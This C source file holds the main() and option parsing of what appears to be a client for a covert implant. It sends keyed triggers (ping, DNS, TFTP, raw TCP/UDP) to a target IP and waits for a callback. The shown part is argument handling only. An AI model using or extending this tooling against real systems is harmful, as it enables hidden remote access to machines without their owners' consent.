//****************************************************************************
#include <pthread.h>
#include <string.h>
#include <stdlib.h>

#include "hclient.h"
#include "trigger.h"
#include "threads.h"
#include "debug.h"
#include "colors.h"

#include "trigger_protocols.h"
#include "crypto_strings_main.h"

#include "proj_strings.h"
#include "proj_strings_main.h"


#ifdef DEBUG
int dbug_level_ = 2;	// debug level
#endif

int initSrandFlag = 0;	//Used as a flag to ensure srand is initialized only once...

//****************************************************************************
// for getopt()
extern int optind, opterr, optopt;

#define	OPT_INVALID	1
#define	OPT_MISSING 2

//****************************************************************************
static int print_opterr( char *exec, int type )
{
	if ( type == OPT_MISSING )
	{
		//fprintf( stderr, "\n%s  ERROR: Option requires an argument -- '%c'%s\n", RED, optopt, RESET );
		fprintf( stderr, "\n%s  %s: %s '%c'%s\n", RED, ErrorString, optionRequiresArgString, optopt, RESET );
	}
	else if ( type == OPT_INVALID )
	{
		//fprintf( stderr, "\n%s  ERROR: Invalid option -- '%c'%s\n", RED, optopt, RESET );
		fprintf( stderr, "\n%s  %s: %s '%c'%s\n", RED, ErrorString, invalidOptionString, optopt, RESET );
	}

	Usage( exec );

	return 0;
}

//****************************************************************************
static void * asloc( char *string )
{
	void	*ptr;
	int		len = strlen( string ) + 1;

	ptr = malloc( len );
	
	if ( ptr == NULL ) exit( -1 );

	memcpy( ptr, string, len );

	return ptr;
}

//****************************************************************************
int main( int argc, char **argv )
{
	struct trigger_params	trigger_args;		// struct to hold arguments for trigger thread
	int			optval;
	unsigned short		port;
	struct proc_vars	pvars;
	int			mode_set = 0;		// once set to one, mode is locked
	uint16_t		trigger_port = 0;

	init_strings();
	init_crypto_strings();

	memset( &trigger_args, 0, sizeof( struct trigger_params ) );

	/* initialization of process variables to default values */
	pvars.command = HELP;
	pvars.progname = asloc( argv[0] );
	pvars.script = NULL;
	pvars.ignore = NO;
	pvars.listen = YES;
	pvars.trigger = NO;
	pvars.interactive = YES;
	pvars.cstring = NULL;
	pvars.tcpfd = -1;
	pvars.trig_delay = DEFAULT_DELAY;
	memset( &pvars.remote, 0, sizeof( struct sockaddr_in ) );
	memset( &pvars.local, 0, sizeof( struct sockaddr_in ) );

	// suppress getopt's error messages. we are going to use our own
	// see print_opterr()
	opterr = 0;

	//initialize srand only once using the initSrandFlag...
    if (!initSrandFlag)
    {
        srand((unsigned int)time(NULL));
        initSrandFlag = 1;
    }

#ifdef DEBUG
	while ( ( optval = getopt(argc, argv, ":a:D:d:k:m:p:P:r:t:")) != -1 )
#else
	while ( ( optval = getopt(argc, argv, ":a:d:k:m:p:P:r:t:")) != -1 )
#endif
	{
		switch( optval )
		{
			// mode: listen, trigger, or both (default)

			// callback IP address
			case 'a':
				if ( !mode_set ) pvars.trigger = YES;
				trigger_args.callback_ip = asloc( optarg );

				if ( inet_aton(optarg, &pvars.remote.sin_addr) == 0 )
				{
					//fprintf( stderr, "invalid IP address specified\n" );
					fprintf( stderr, "%s", invalidIPAddressString );
					return -1;
				}
				break;
#ifdef DEBUG
			case 'D':
				dbug_level_ = atoi(optarg);
				break;
#endif
				// trigger callback delay
			case 'd':
				if ( !mode_set ) pvars.trigger = YES;
				pvars.trig_delay = (unsigned int)atoi( optarg );
				break;

			// ID key -- sent as the SHA1 hash of the text key specified.
			case 'k':
				if (strlen(optarg) >= ID_KEY_LENGTH_MIN)
					sha1((const unsigned char *)optarg, strlen(optarg), trigger_args.triggerKey);
				else {
					print_opterr( argv[0], OPT_INVALID );
					return -1;
				}
				break;

			case 'K':
				{	struct stat	statbuf;

					if (access(optarg, R_OK)) {
						fprintf( stderr, "%s", invalidFileParameter);
					}
					if (stat(optarg, &statbuf) != 0) {
						perror("Option K");
						return -1;
					}
					if (statbuf.st_size >= ID_KEY_LENGTH_MIN)
						sha1_file((const char *)optarg, trigger_args.triggerKey);
					else {
						print_opterr( argv[0], OPT_INVALID );
						return -1;
					}
					break;
				}

			case 'm':
				if ( ( strncmp( optarg, "a", 1 ) == 0 ) || ( strncmp( optarg, "b", 1 ) == 0 ) )
				{	// both or all (default)
					pvars.trigger = YES;
					pvars.listen = YES;
				}
				else if ( strncmp( optarg, "l", 1 ) == 0 )
				{	// listen
					pvars.trigger = NO;
					pvars.listen = YES;
				}
				else if ( strncmp( optarg, "t", 1 ) == 0 )
				{	// trigger
					pvars.trigger = YES;
					pvars.listen = NO;
				}
				mode_set = YES;
				break;

				// callback port
			case 'p':
				port = atoi(optarg);

				if ( !mode_set ) pvars.listen = YES;
				pvars.local.sin_port = htons(port);

				trigger_args.callback_port = asloc( optarg );
				break;

				// trigger protocol
			case 'P':
				if ( !mode_set ) pvars.trigger = YES;
				trigger_args.type = asloc( optarg );

				if ( parse_trig( trigger_args.type, NULL ) != SUCCESS )
				{
					//fprintf( stderr, "\n  %sERROR:%s Invalid trigger protocol.  Supported protocols are:\n", RED, RESET );
					//fprintf( stderr, "\tping-request\n" );		pingRequestString
					//fprintf( stderr, "\tping-reply\n" ); 			pingReplyString
					//fprintf( stderr, "\ticmp-error\n" );			icmpErrorString
					//fprintf( stderr, "\ttftp-wrq\n" );			tftpWrqString
					//fprintf( stderr, "\tdns-request\n" );			dnsRequestString	
					//fprintf( stderr, "\traw-tcp\n" );				rawTcpString
					//fprintf( stderr, "\traw-udp\n" );				rawUdpString
					fprintf( stderr, "\n  %s%s:%s %s", RED, ErrorString, invalidProtocolString, RESET );
					fprintf( stderr, "%s", rawTcpString );
					fprintf( stderr, "%s", rawUdpString );
					Usage( argv[0] );
					return -1;
				}
				break;

			// trigger port for raw triggers
			case 'r':
				if ( !mode_set ) pvars.trigger = YES;
				trigger_args.raw_port = asloc( optarg );
				trigger_port = atoi( optarg );
				break;

				// "target" to trigger; IP address
			case 't':
				if ( !mode_set ) pvars.trigger = YES;
				trigger_args.target_ip = asloc( optarg );

				// we don't need the address converted here, but this function
				// helps validate user input in correct format
				// 'local' unused, otherwise
				if ( inet_aton(optarg, &pvars.local.sin_addr) == 0 )
				{
					//fprintf( stderr, "invalid IP address specified\n" );
					fprintf( stderr, "%s", invalidIPAddressString );
					return -1;
				}
				break;
			// if getopt() detects an option with a missing argument, it will return ':'
			// and set the extern variable 'optopt' to the offending option 
			// ':' is returned instead of '?' because the optstring starts with a leading ':'
			// this help differentiate the type of error: invalid option vs. missing option
			case ':':
				print_opterr( argv[0], OPT_MISSING );
				return -1;
				break;

			// if getopt() detects an invalid option, it will return '?'
			// and set the extern variable 'optopt' to the offending option 
			case '?':
				print_opterr( argv[0], OPT_INVALID );
				return -1;
				break;
		}
	}

	// Check user inputs
	// client can be run in three modes:
	// 		(1) send triggers only
	//		(2) listen for callbacks only
	// 		(3) send triggers THEN listen ( e.g (1)->(2) )
	// complete options must be provided for all modes	

	if ( ( pvars.trigger == NO ) && ( pvars.listen == NO ) )
	{
		Usage( argv[0] );
		return -1;
	}

	// Argument validation for callbacks:
	// Only the -p option is specified and that option is,
	// essentially, checked above when the -p option is processed

	// Argument validation for triggers:
	// -t, -a, -p, and -P must all be set
	// TODO: verify that arguments will be validated by the trigger functions
	if ( pvars.trigger == YES )
	{
		// then at least one of the following options were set: -t, -a, or -P
		if ( ( trigger_args.callback_ip == 0 ) ||
			( trigger_args.callback_port == 0 ) ||
			( trigger_args.target_ip == 0 ) ||
			( trigger_args.triggerKey == 0 ) ||
			( trigger_args.type == 0 ) )
		{
			//printf( "\n  %sERROR: Incomplete options%s\n", RED, RESET );
			printf( "\n  %s%s: %s%s\n", RED, ErrorString, incompleteOptionString, RESET );
			// options incomplete
			Usage( argv[0] );
			return -1;
		}

		if ( trigger_args.type != NULL )
		{
			if ( ( strncmp( trigger_args.type, "raw-t", 5 ) == 0 ) || ( strncmp( trigger_args.type, "raw-u", 5 ) == 0 ) )
			{	// raw triggers specified, therefore, must also include the trigger port
				if ( trigger_port == 0 )
				{
					//printf( "\n  %sERROR: Incomplete options%s\n", RED, RESET );
					printf( "\n  %s%s: %s%s\n", RED, ErrorString, incompleteOptionString, RESET );
					Usage( argv[0] );
					return -1;
				}
			}
		}

	}

	if ( pvars.listen == YES )
	{
		// callback port must be specified
		if ( trigger_args.callback_port == 0 )
		{
			//printf( "\n  %sERROR: Incomplete options%s\n", RED, RESET );
			printf( "\n  %s%s: %s%s\n", RED, ErrorString, incompleteOptionString,RESET );
			// options incomplete
			Usage( argv[0] );
			return -1;
		}
	}

	Run( &pvars, &trigger_args );

	return 0;

	// TODO

   /* process clean-up and exit*/
   if (pvars.script != NULL) {
      free(pvars.script);
      FreeArgv(pvars.cstring);
   }

   return 0;
}
